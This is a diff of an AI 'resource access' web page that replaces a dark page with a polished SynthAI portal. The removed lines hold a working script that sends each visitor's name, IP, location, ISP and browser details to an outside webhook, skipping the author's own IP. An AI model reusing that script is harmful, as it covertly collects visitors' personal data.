@@ -3,169 +3,458 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova AI Resources Access</title>
+    <title>SynthAI | Resource Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #4a3ce7;
+            --accent: #00cec9;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --success: #00b894;
+            --warning: #fdcb6e;
+            --error: #d63031;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(to right, #2c3e50, #bdc3c7);
+            background-color: #f8f9fd;
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        
+        .admin-bar {
+            background: var(--dark);
             color: white;
-            padding: 50px;
-            text-align: center;
+            padding: 0.5rem 2rem;
+            font-size: 0.8rem;
+            display: flex;
+            justify-content: flex-end;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .admin-bar a {
+            color: var(--accent);
+            text-decoration: none;
+            margin-left: 1.5rem;
+        }
+        
+        .navbar {
+            background-color: white;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+            padding: 1.2rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .logo i {
+            margin-right: 0.5rem;
+            color: var(--accent);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: var(--dark);
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+        
+        .auth-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: calc(100vh - 120px);
+            padding: 4rem 2rem;
+        }
+        
+        .auth-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
             overflow: hidden;
+            transition: all 0.4s ease;
         }
-
-        .container {
-            background-color: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
-            padding: 30px;
-            width: 400px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-        }
-
-        p {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            font-size: 1.2em;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            background: #fff;
-            color: #333;
-        }
-
-        button {
-            padding: 12px 20px;
-            font-size: 1.2em;
-            background-color: #27ae60;
+        
+        .auth-header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             color: white;
-            border: none;
-            border-radius: 5px;
+            padding: 2rem;
+            text-align: center;
+        }
+        
+        .auth-header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .auth-header p {
+            opacity: 0.9;
+            font-size: 0.95rem;
+        }
+        
+        .auth-body {
+            padding: 2rem;
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            font-size: 1rem;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
             width: 100%;
         }
-
-        button:hover {
-            background-color: #2ecc71;
+        
+        .btn-primary:hover {
+            background: var(--secondary);
+            transform: translateY(-2px);
         }
-
-        .hidden {
-            display: none;
+        
+        .btn-block {
+            display: block;
+            width: 100%;
         }
-
-        .motivational-message {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-            color: #e74c3c;
+        
+        .resources-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
         }
-
-        .hidden-button {
-            display: none;
+        
+        .resource-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+        
+        .resource-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        .resource-img {
+            height: 180px;
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .resource-body {
+            padding: 1.5rem;
+        }
+        
+        .resource-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+        
+        .resource-desc {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 1rem;
+        }
+        
+        .resource-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        .welcome-message {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        
+        .welcome-message h2 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+        }
+        
+        .user-badge {
+            display: inline-flex;
+            align-items: center;
+            background: var(--light);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            margin-bottom: 1rem;
+        }
+        
+        .user-badge i {
+            margin-right: 0.5rem;
+            color: var(--primary);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        footer {
+            background: var(--dark);
+            color: white;
+            text-align: center;
+            padding: 2rem;
+            font-size: 0.9rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: white;
+        }
+        
+        .copyright {
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Nova AI Resources Access</h1>
-        <p>Please enter your name to unlock exclusive access to Nova AI resources!</p>
-        <div id="name-form">
-            <input type="text" id="userName" placeholder="Enter your name here...">
-            <button onclick="handleNameSubmission()">Unlock Resources</button>
+    <div class="admin-bar">
+        <a href="#"><i class="fas fa-user-shield"></i> Admin Portal</a>
+        <a href="#"><i class="fas fa-question-circle"></i> Support</a>
+    </div>
+    
+    <nav class="navbar">
+        <div class="logo">
+            <i class="fas fa-brain"></i>
+            <span>SynthAI</span>
         </div>
-        <div id="motivational-message" class="motivational-message hidden">
-            <p>Your access to Nova AI is just one step away! Add your name to unlock it.</p>
+        <div class="nav-links">
+            <a href="#">Products</a>
+            <a href="#">Research</a>
+            <a href="#">Solutions</a>
+            <a href="#">Pricing</a>
+        </div>
+    </nav>
+    
+    <div class="auth-container">
+        <div class="auth-card">
+            <div class="auth-header">
+                <h1>Resource Portal</h1>
+                <p>Access premium AI resources and tools</p>
+            </div>
+            
+            <div class="auth-body">
+                <!-- Step 1: Name Entry -->
+                <div class="step active" id="step1">
+                    <div class="form-group">
+                        <label for="userName">Enter your full name</label>
+                        <input type="text" class="form-control" id="userName" placeholder="John Doe">
+                    </div>
+                    <button class="btn btn-primary" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
+                </div>
+                
+                <!-- Step 2: Resource Display -->
+                <div class="step" id="step2">
+                    <div class="welcome-message">
+                        <div class="user-badge">
+                            <i class="fas fa-user-check"></i>
+                            <span id="welcomeName">Welcome, User</span>
+                        </div>
+                        <h2>Your Exclusive Resources</h2>
+                        <p>Curated AI tools and datasets for your projects</p>
+                    </div>
+                    
+                    <div class="resources-grid" id="resourceGrid">
+                        <!-- Resources will be dynamically inserted here -->
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Security</a>
+            <a href="#">Careers</a>
+        </div>
+        <div class="copyright">
+            &copy; 2023 SynthAI Technologies. All rights reserved.
+        </div>
+    </footer>
 
     <script>
-        const ADMIN_IP = "83.105.112.217"; // Your IP to exclude
-        let spamCount = 0;
-        let spamInterval;
+        // Sample abstract images from Unsplash
+        const abstractImages = [
+            "https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
+            "https://images.unsplash.com/photo-1579547945413-497e1b99dac0?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
+            "https://images.unsplash.com/photo-1635070041078-e363dbe005cb?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
+            "https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
+            "https://images.unsplash.com/photo-1563089145-599997674d42?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
+            "https://images.unsplash.com/photo-1451187580459-43490279c0fa?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800"
+        ];
 
-        // Function to generate random console data spam
-        function generateSpam() {
-            const randomData = Math.random().toString(36).substring(2, 15);
-            console.log(randomData);
-            spamCount++;
-
-            // Clear console after 300 logs
-            if (spamCount >= 300) {
-                clearInterval(spamInterval);
-                console.clear();
+        // Sample resources data
+        const resources = [
+            {
+                title: "Neural Network Architectures",
+                desc: "Collection of advanced NN architectures with implementation guides",
+                category: "Framework"
+            },
+            {
+                title: "AI Dataset Library",
+                desc: "Curated datasets for machine learning projects across industries",
+                category: "Data"
+            },
+            {
+                title: "Model Optimization Toolkit",
+                desc: "Tools and techniques for optimizing AI model performance",
+                category: "Tools"
+            },
+            {
+                title: "Research Papers Digest",
+                desc: "Summaries of breakthrough AI research papers",
+                category: "Research"
+            },
+            {
+                title: "Deployment Templates",
+                desc: "Ready-to-use templates for deploying AI models in production",
+                category: "DevOps"
+            },
+            {
+                title: "Ethics Guidelines",
+                desc: "Framework for responsible AI development and deployment",
+                category: "Governance"
             }
-        }
+        ];
 
-        // Start console spam when page loads
-        spamInterval = setInterval(generateSpam, 50); // Spamming every 50ms
-
-        async function handleNameSubmission() {
+        function nextStep() {
             const userName = document.getElementById('userName').value.trim();
-
+            
             if (!userName) {
-                // Display motivational message
-                document.getElementById('motivational-message').classList.remove('hidden');
+                alert("Please enter your name to continue");
                 return;
             }
-
-            try {
-                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
-
-                if (ipData.ip === ADMIN_IP) {
-                    // Skip if IP is yours
-                    console.log("Admin IP detected. No data will be sent.");
-                    return;
-                }
-
-                const userAgent = navigator.userAgent;
-                const log = {
-                    name: userName,
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    country: ipData.country,
-                    isp: ipData.org,
-                    userAgent,
-                    time: new Date().toISOString()
-                };
-
-                // Replace with your unique webhook URL
-                const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net"; 
-
-                const response = await fetch(webhookUrl, {
-                    method: "POST",
-                    body: JSON.stringify(log),
-                    headers: { "Content-Type": "application/json" }
-                });
-
-                if (response.ok) {
-                    console.log("Data successfully sent to the webhook.");
-                } else {
-                    console.error("Error sending data to webhook:", response.status);
-                }
-
-            } catch (e) {
-                console.error("Error sending data:", e);
-            }
-
-            // Hide form and display success message
-            document.getElementById('name-form').classList.add('hidden');
-            document.getElementById('motivational-message').classList.add('hidden');
-            alert("You have unlocked Nova AI Resources! Enjoy your access!");
+            
+            // Log the user data (you can add your webhook logic here)
+            console.log("User accessed resources:", userName, new Date().toISOString());
+            
+            // Update welcome message
+            document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
+            
+            // Hide step 1 and show step 2
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            
+            // Load resources with random abstract images
+            loadResources();
         }
 
+        function loadResources() {
+            const grid = document.getElementById('resourceGrid');
+            grid.innerHTML = '';
+            
+            resources.forEach((resource, index) => {
+                const imgUrl = abstractImages[Math.floor(Math.random() * abstractImages.length)];
+                
+                const card = document.createElement('div');
+                card.className = 'resource-card';
+                card.innerHTML = `
+                    <div class="resource-img" style="background-image: url('${imgUrl}')"></div>
+                    <div class="resource-body">
+                        <h3 class="resource-title">${resource.title}</h3>
+                        <p class="resource-desc">${resource.desc}</p>
+                        <div class="resource-meta">
+                            <span><i class="fas fa-tag"></i> ${resource.category}</span>
+                            <span><i class="fas fa-download"></i> Download</span>
+                        </div>
+                    </div>
+                `;
+                
+                grid.appendChild(card);
+            });
+        }
     </script>
 </body>
 </html>
